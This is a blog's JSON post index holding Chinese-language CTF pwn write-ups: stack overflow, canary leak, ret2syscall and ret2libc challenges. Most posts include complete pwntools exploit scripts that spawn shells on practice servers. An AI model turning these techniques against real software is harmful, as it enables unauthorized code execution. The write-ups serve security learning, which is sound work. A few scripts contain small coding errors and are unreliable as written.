{"meta":{"title":"Hexo","subtitle":"","description":"","author":"WuXianKwY","url":"https://WuXianKwY.github.io","root":"/"},"pages":[{"title":"文章归档","date":"2023-07-29T05:43:40.681Z","updated":"2023-07-29T05:43:40.681Z","comments":true,"path":"guidang.html","permalink":"https://wuxiankwy.github.io/guidang.html","excerpt":"","text":""}],"posts":[{"title":"","slug":"not_the_same_3dsctf_2016——练习","date":"2023-08-23T10:57:14.633Z","updated":"2023-08-23T10:54:20.838Z","comments":true,"path":"2023/08/23/not_the_same_3dsctf_2016——练习/","link":"","permalink":"https://wuxiankwy.github.io/2023/08/23/not_the_same_3dsctf_2016%E2%80%94%E2%80%94%E7%BB%83%E4%B9%A0/","excerpt":"","text":"not_the_same_3dsctf_2016——练习checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) IDA32反编译，是静态编译 main函数没有什么端倪，但是发现这里的main没有ebp 12345678910111213141516171819202122.text:080489E0.text:080489E0.text:080489E0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:080489E0 public main.text:080489E0 main proc near ; DATA XREF: _start+17↑o.text:080489E0.text:080489E0 var_3C = dword ptr -3Ch.text:080489E0 var_2D = byte ptr -2Dh.text:080489E0 argc = dword ptr 4.text:080489E0 argv = dword ptr 8.text:080489E0 envp = dword ptr 0Ch.text:080489E0.text:080489E0 sub esp, 3Ch.text:080489E3 mov [esp+3Ch+var_3C], offset aB0r4V3rS37u4hO ; &quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;.text:080489EA call printf.text:080489EF lea eax, [esp+3Ch+var_2D].text:080489F3 mov [esp+3Ch+var_3C], eax.text:080489F6 call gets.text:080489FB xor eax, eax.text:080489FD add esp, 3Ch.text:08048A00 retn &lt;--.text:08048A00 main endp 注意栈溢出时不需要再覆盖ebp的四个值 找了一会没有找到和system，bin有关的函数和字符串，但在字符串区发现了flag.text 12345.rodata:080BC2A8 00000009 C flag.txt.rodata:080BC2B1 00000024 C b0r4 v3r s3 7u 4h o b1ch4o m3m0... .rodata:080BC2D5 00000014 C ../csu/libc-start.c.rodata:080BC2E9 00000017 C FATAL: kernel too old\\n.rodata:080BC300 00000030 C __ehdr_start.e_phentsize == sizeof *GL(dl_phdr) 跟进去看看 CTRL+C进入调用函数get_secret() 12345678int get_secret()&#123; int v0; // esi v0 = fopen(&quot;flag.txt&quot;, &amp;unk_80CF91B); fgets(&amp;fl4g, 45, v0); return fclose(v0);&#125; 分析函数，flag被储存在fl4g里，找到fl4g的bss地址:080ECA2D，进行栈溢出 1234.bss:080ECA2C db ? ;.bss:080ECA2D public fl4g.bss:080ECA2D fl4g db ? ; ; DATA XREF: get_secret+26↑o.bss:080ECA2E db ? ; 需要把flag打印出来，这里可以用print，put，write函数 想到main里就摆着一个printf，直接调用它打印，至于其他函数，有则可用 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+Fh] [ebp-2Dh] printf((int)&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;); gets(&amp;v4); return 0;&#125; 编写exp： 123456789101112from pwn import *p = remote(&quot;node4.buuoj.cn&quot;,26828)elf = ELF(&quot;./NTS&quot;)flag_addr = 0x080ECA2Dsecret_addr = 0x080489A0printf_addr = 0x0804F0A0payload = 0x2d * b&#x27;a&#x27; + p32(secret_addr) + p32(printf_addr) + p32(elf.sym[&#x27;exit&#x27;]) + p32(flag_addr)p.sendline(payload)p.interactive() 补充：这里的flag在缓冲区，需要程序结束printf才能打印缓冲区的内容，所以额外调用了exit.","categories":[],"tags":[]},{"title":"ciscn_2019_ne_5","slug":"ciscn-2019-ne-5","date":"2023-08-11T09:38:11.000Z","updated":"2023-08-11T09:58:18.292Z","comments":true,"path":"2023/08/11/ciscn-2019-ne-5/","link":"","permalink":"https://wuxiankwy.github.io/2023/08/11/ciscn-2019-ne-5/","excerpt":"","text":"ciscn_2019_ne_5checksec一下 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) F12查字符串发现与flag有关的字符串，告诉我们咱们输入的log就是字符串 1234567.rodata:080489DB 00000006 C %128s.rodata:080489E1 00000014 C echo Printing.......rodata:080489F5 00000019 C The flag is your log:%s\\n.rodata:08048A0E 00000014 C Welcome to use LFS..rodata:08048A22 0000001D C Please input admin password:.rodata:08048A3F 00000006 C %100s.rodata:08048A45 0000000E C administrator log在哪输入呢？反编译main看看代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // [esp+0h] [ebp-100h] char src[4]; // [esp+4h] [ebp-FCh] char v5; // [esp+8h] [ebp-F8h] char s1[4]; // [esp+84h] [ebp-7Ch] char v7; // [esp+88h] [ebp-78h] const char *v8; // [esp+E8h] [ebp-18h] int *v9; // [esp+ECh] [ebp-14h] int *v10; // [esp+F4h] [ebp-Ch] v10 = &amp;argc; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); fflush(stdout); *(_DWORD *)s1 = 48; memset(&amp;v7, 0, 0x60u); *(_DWORD *)src = 48; memset(&amp;v5, 0, 0x7Cu); puts(&quot;Welcome to use LFS.&quot;); printf(&quot;Please input admin password:&quot;); __isoc99_scanf(); if ( strcmp(s1, &quot;administrator&quot;) ) &#123; puts(&quot;Password Error!&quot;); exit(0); &#125; puts(&quot;Welcome!&quot;); while ( 1 ) &#123; puts(&quot;Input your operation:&quot;); puts(&quot;1.Add a log.&quot;); puts(&quot;2.Display all logs.&quot;); puts(&quot;3.Print all logs.&quot;); printf(&quot;0.Exit\\n:&quot;); v9 = &amp;v3; v8 = &quot;%d&quot;; __isoc99_scanf(); switch ( v3 ) &#123; case 0: exit(0); return; case 1: AddLog(src); break; case 2: Display(src); break; case 3: Print(); break; case 4: GetFlag(src); break; default: continue; &#125; &#125;&#125; 这里不知道为什么scanf不显示读入的数据和长度，又去汇编看了下是100个长度，读入s1，可以栈溢出 之前字符串里注意到有system函数，直接查地址调用 123LOAD:08048321 00000007 C stderrLOAD:08048328 00000007 C systemLOAD:0804832F 00000007 C setbuf ropper搜不到&#x2F;bin&#x2F;sh但是找到了sh字段，查了下可以当作&#x2F;bin&#x2F;sh用 shell_addr=0x80482ea 之后构造俺们的payload 1payload=b‘a’*（0x48+4）+p32(system_addr)+b‘aaaa’+p32(shell_addr) 发送payload后根据题意选4让系统调用我们的”log”从而获取shell exp： 12345678910111213141516171819202122from pwn import*r=remote(&quot;node4.buuoj.cn&quot;,29749)elf=ELF(&#x27;n5&#x27;)system_addr=elf.sym[&#x27;system&#x27;]shell_addr=0x80482ear.recvuntil(&#x27;Please input admin password:&#x27;)r.sendline(&#x27;administrator&#x27;)r.recvuntil(&#x27;0.Exit\\n:&#x27;)r.sendline(&#x27;1&#x27;)payload=b&#x27;a&#x27;*(0x48+4)+p32(system_addr)+b&#x27;1234&#x27;+p32(shell_addr)r.recvuntil(&#x27;Please input new log info:&#x27;)r.sendline(payload)r.recvuntil(&#x27;0.Exit\\n:&#x27;)r.sendline(&#x27;4&#x27;)r.interactive()","categories":[],"tags":[]},{"title":"CTF-WP","slug":"CTF-WP","date":"2023-08-11T08:47:57.000Z","updated":"2023-08-11T08:57:20.920Z","comments":true,"path":"2023/08/11/CTF-WP/","link":"","permalink":"https://wuxiankwy.github.io/2023/08/11/CTF-WP/","excerpt":"","text":"canarychecksec下，32位，开启canary，NX Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) sym.vuln函数中存在溢出，read可以向0x70的栈中读取0x200的内容, 之后printf会打印read读入的字符串。 开启canary，没法直接栈溢出 第一次溢出 覆写Canary低字节\\x00，读取出Canary值 payload_1 = b&#39;a&#39; * (0x70 - 0xc + 0x1) 第二次溢出 利用泄露的canary进行栈溢出 payload_2 = b&#39;a&#39; * (0x70 - 0xc) + p32(Canary) + b&#39;a&#39; * 0xc + p32(getshell) exp 12345678910111213141516171819from pwn import *context.log_level = &#x27;debug&#x27;io = remote(&quot;xxxx&quot;,xxx)getshell = 0x080491b2io.recvuntil(&#x27;Hello Hacker!\\n&#x27;)payload_1 = b&#x27;a&#x27; * (0x70 - 0xc)io.send(payload_1)recvbytes = conn.recv()canary = u32(recvbytes[0x65:0x68].rjust(4, b&#x27;\\x00&#x27;))print(f&#x27;Canary: &#123;hex(canary)&#125;&#x27;)payload_2 = b&#x27;a&#x27; * (0x70 - 0xc) + p32(canary) + b&#x27;a&#x27; * 0xc + p32(getshell)io.send(payload_2)io.recv()io.interactive() Hello_Worldchecksec走一走 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 32位，只有NX IDA反编译，找到vulnerable_function() ssize_t vulnerable_function()&#123; char buf[136]; // [esp+0h] [ebp-88h] BYREF system(&quot;echo Input:&quot;); return read(0, buf, 0x100u);&#125; buf可以溢出，再看plt表 .plt:08048320 ; Attributes: thunk.plt:08048320.plt:08048320 ; int system(const char *command).plt:08048320 _system proc near ; CODE XREF: vulnerable_function+11↓p.plt:08048320 ; main+1E↓p.plt:08048320 找到system，利用system执行“&#x2F;bin&#x2F;sh” exp： from pwn import * elf = ELF(&quot;./level2&quot;)p = remote(&quot;111.200.241.244&quot; , 64128)#p = process(&quot;./level2&quot;) system_plt = elf.plt[&quot;system&quot;]bin_sh = next(elf.search(b&quot;/bin/sh&quot;))payload = b&#39;a&#39; * ( 0x88 +4) # 覆盖的垃圾数据payload = payload + p32(system_plt) # system的地址payload = payload + b&#39;a&#39;*4 # system的返回地址payload = payload + p32(bin_sh) p.recvline(&quot;Input:&quot;)p.sendline(payload) p.interactive() ret2syscallchecksec查一下 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) IDA反编译，发现gets()读入无限制字符 gdb调试 可以看到输入的数据AAAAAAAAAA在地址0xffffd09c 的位置 计算到main的距离为108+4&#x3D;112 int 0x80(0xb,&#39;/bin/sh&#39;,0,0)执行sys_execve(“/bin/sh”,0,0) 之后是繁琐的ropper或ROPgadget的寻找过程 exp: 123456789101112131415from pwn import *io = process(&quot;./ret2syscall&quot;) //创建一个程序的进程`addr_eax = 0x080bb196 addr_edx_ecx_ebx = 0x0806eb90 addr_binsh = 0x080be408addr_int _0x80 = 0x08049421payload = flat([b&#x27;A&#x27;*112, addr_eax, 0xb, addr_edx_ecx_ebx, 0, 0, addr_binsh, addr_int_0x80])//flat函数是专门为形成payload设计的函数，它可以把列表里的每一项都转换成字节流，最后把列表里的每一项拼接起来 payload = b&#x27;A&#x27;*112 + p32(addr_eax) + p32(0xb) + p32(addr_edx_ecx_ebx) + p32(0) + p32(0) + p32(addr_binsh) + p32(addr_int_0x80)io.sendline(payload)io.interactive()","categories":[],"tags":[]},{"title":"CTF【ciscn_2019_c_1】","slug":"第一篇文章","date":"2023-07-29T04:18:16.372Z","updated":"2023-07-29T06:09:00.802Z","comments":true,"path":"2023/07/29/第一篇文章/","link":"","permalink":"https://wuxiankwy.github.io/2023/07/29/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/","excerpt":"","text":"攻击思路定向ret2libc由于程序本身并没有 system /bin/sh的调用，放弃使用ret2text和ret2syscall的想法 故我们考虑利用 ret2libc 通过已经调用过的函数去泄露它在程序中的地址，然后利用地址末尾的3个字节，去找到该程序所用的libc版本； 程序中函数的地址跟libc中函数的地址的关系： 1程序函数地址=加载程序的基址+libc中函数偏移量 构造payload1 main_addr：通过IDA64即可查看main函数的起始地址为0x400B28 pop_rdi_addr：可通过使用ROPgadget工具进行查找，可得地址为 0x400c83 1ROPgadget --binary ciscn_2019_c_1 |grep &quot;pop rdi&quot; puts_got_addr：通过ELF程序获取 elf.got[&#39;puts&#39;] puts_plt_addr：通过ELF程序获取 elf.plt[&#39;puts&#39;] 综上，我们可以构造第一段payload为(payload首部加入‘\\0’是为了绕过encrypt函数，防止输入的字符串加密而变化，strlen()函数遇‘\\0’截止)1payload = b&#x27;\\0&#x27; + b&#x27;a&#x27;*(0x50 - 1 + 0x8) + p64(pop_got_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr) 我们通过 \\0截断了encrypt函数，但是函数仍然会执行并产生空输出； 所以我们通过puts函数输出的puts函数的地址则会在输出两行之后输出； 所以我们通过两次p.recvline()接收； 通过libc查询偏移地址两行字符串后使用puts_addr=u64(p.recvuntil(b&#39;\\n&#39;)[:-1].ljust(8,b&#39;\\0&#39;))接收puts函数的地址； 通过使用LibcSearcher查询对应的libc版本 1libc = LibcSearcher(&#x27;puts&#x27;, puts_addr) 故我们可以计算加载程序的基址，通过基址和各个函数以及字符串的偏移量可以计算各个函数以及字符串在程序中的地址 123456789101112libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)baseaddr = puts_addr-libc.dump(&#x27;puts&#x27;)print(&#x27;程序基址：&#x27; + hex(baseaddr))#/bin/sh字符串的偏移地址binsh_addr_offset = libc.dump(&#x27;str_bin_sh&#x27;) #system函数的偏移地址system_offset = libc.dump(&#x27;system&#x27;)binsh_addr = baseaddr + binsh_addr_offsetsystem_addr = baseaddr + system_offset 使用ret指令来实现堆栈平衡 构造payload212345payload = b&#x27;\\0&#x27; + b&#x27;a&#x27;*(0x50 - 1 + 8)payload += p64(ret_addr) #堆栈平衡payload += p64(pop_rdi_addr) #将system函数的参数保存到rdi中payload += p64(binsh_addr) #pop指令的执行的操作数payload += p64(system_addr) #调用system函数获得shell Final exp：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *from LibcSearcher import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;info&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,29745)#p = process(&#x27;./ciscn_2019_c_1&#x27;)elf = ELF(&#x27;./ciscn_2019_c_1&#x27;)main_addr = 0x400b28pop_rdi_addr = 0x400c83ret_addr = 0x4006b9puts_got_addr = elf.got[&#x27;puts&#x27;]puts_plt_addr = elf.plt[&#x27;puts&#x27;]p.sendlineafter(b&#x27;Input your choice!\\n&#x27;, b&#x27;1&#x27;)payload = b&#x27;\\0&#x27; + b&#x27;a&#x27;*(0x50 - 1 + 8)payload += p64(pop_rdi_addr) payload += p64(puts_got_addr)payload += p64(puts_plt_addr)payload += p64(main_addr)p.sendlineafter(b&#x27;Input your Plaintext to be encrypted\\n&#x27;, payload)p.recvline()p.recvline()puts_addr=u64(p.recvuntil(b&#x27;\\n&#x27;)[:-1].ljust(8,b&#x27;\\0&#x27;))#puts_addr = 0x7f8685384970print(&#x27;puts函数地址：&#x27; + hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)baseaddr = puts_addr-libc.dump(&#x27;puts&#x27;)print(&#x27;程序基址：&#x27; + hex(baseaddr))binsh_addr_offset = libc.dump(&#x27;str_bin_sh&#x27;) system_offset = libc.dump(&#x27;system&#x27;)binsh_addr = baseaddr + binsh_addr_offsetsystem_addr = baseaddr + system_offsetp.sendlineafter(b&#x27;Input your choice!\\n&#x27;, b&#x27;1&#x27;)payload = b&#x27;\\0&#x27; + b&#x27;a&#x27;*(0x50 - 1 + 8)payload += p64(ret_addr)payload += p64(pop_rdi_addr)payload += p64(binsh_addr)payload += p64(system_addr)p.sendlineafter(b&#x27;Input your Plaintext to be encrypted\\n&#x27;, payload)p.interactive()","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2023-07-29T04:14:42.833Z","updated":"2023-07-29T04:14:42.833Z","comments":true,"path":"2023/07/29/hello-world/","link":"","permalink":"https://wuxiankwy.github.io/2023/07/29/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"","slug":"pwn学习记录","date":"2023-05-17T09:09:04.124Z","updated":"2023-07-29T06:10:45.837Z","comments":true,"path":"2023/05/17/pwn学习记录/","link":"","permalink":"https://wuxiankwy.github.io/2023/05/17/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"pwn学习记录常见栈溢出函数 存在strlen，可以使用\\0截断put，get函数可用libc解题控制execve的参数：eax，ebx[execve(“&#x2F;bin&#x2F;sh”,0,0) &#x3D; int 0x80(0xb,’&#x2F;bin&#x2F;sh’,0,0)]控制puts的参数：rdi ret 利用got与plt表获取部分函数地址，例如（获取put函数）： puts_plt&#x3D;elf.plt[‘puts’] puts_got&#x3D;elf.got[‘puts’] 利用ropper查询gadget的命令：ropper –file 文件名称 –search “pop eax；ret” ret2syscall： int 0x80实现系统调用：寄存器传参。 eax保存系统调用号 ebx第一个参数 ecx第三个参数 例：execve（bin&#x2F;sh,0,0）eax&#x3D;bin&#x2F;sh调用号 ebx&#x3D;0 ecx&#x3D;0 利用ropper查询pop eax，ebx，ecx，edx 利用gdb查询垃圾数据填充数：例：get到ebp的数据长度+previous ebp的4个字节 构造payload ret2libc: 在题目开启了地址随机化后，插入的shellcode的真实地址无法确定，不能直接返回到shellcode，所以需要使用retlibc来完成。 传统的ret2shellcode只覆盖了return address部分，ret2libc覆盖了return address以及其上方地址的一部分。 父函数保存了子函的参数和要返回的地址（ret address），子函数保存了父函数的参数和父函数栈底的地址（previous ebp） 可在pwndbg中查询plt与got值 在函数被调用前，got表中存入的是函数在plt表中的地址，在该函数段执行调用后，got表中存入的变为函数的真实地址 如果题目中无法找到后门函数的地址，则可以利用libc来找到system函数的地址，libc的基地址可以利用已经被调用过的函数来查找","categories":[],"tags":[]}],"categories":[],"tags":[]}